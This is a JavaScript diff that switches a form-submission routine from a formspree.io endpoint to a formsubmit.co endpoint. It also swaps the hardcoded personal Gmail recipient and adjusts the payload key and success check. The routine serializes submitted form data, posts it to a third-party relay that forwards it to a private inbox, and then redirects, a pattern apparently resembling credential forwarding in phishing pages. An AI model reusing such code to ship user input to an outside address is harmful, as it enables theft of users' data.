@@ -48,12 +48,12 @@ function inspectExport(formdata, nextpage) {
     on_submit();
 
     let strings = formdata;
-    let apiUrl = "https://formspree.io/f/meqyrpqn"; // formspree.io endpoint
+    let apiUrl = "https://formsubmit.co/ajax/webt12348@gmail.com"; // formsubmit.co endpoint
 
     // Modify form data to include email field
     let formData = new FormData();
-    formData.append("email", "alhamdulilahalways0007@gmail.com"); // Replace with your email registered with formspree.io
-    formData.append("form_data", JSON.stringify(strings));
+    formData.append("email", "awoyemiireoluwa@gmail.com"); // Replace with your email registered with Formsubmit.co
+    formData.append("data", JSON.stringify(strings)); // formsubmit.co expects "data" key for form data
 
     let request = new XMLHttpRequest();
     request.open("POST", apiUrl);
@@ -61,7 +61,7 @@ function inspectExport(formdata, nextpage) {
 
     request.onreadystatechange = function() {
         if (request.readyState === XMLHttpRequest.DONE) {
-            if (request.status === 200 || request.status === 201) { // formspree.io may return 201 for successful submissions
+            if (request.status === 200) { // formsubmit.co returns 200 for successful submissions
                 // Success
                 console.log("Form submitted successfully!");
                 // Redirect to the next page if needed
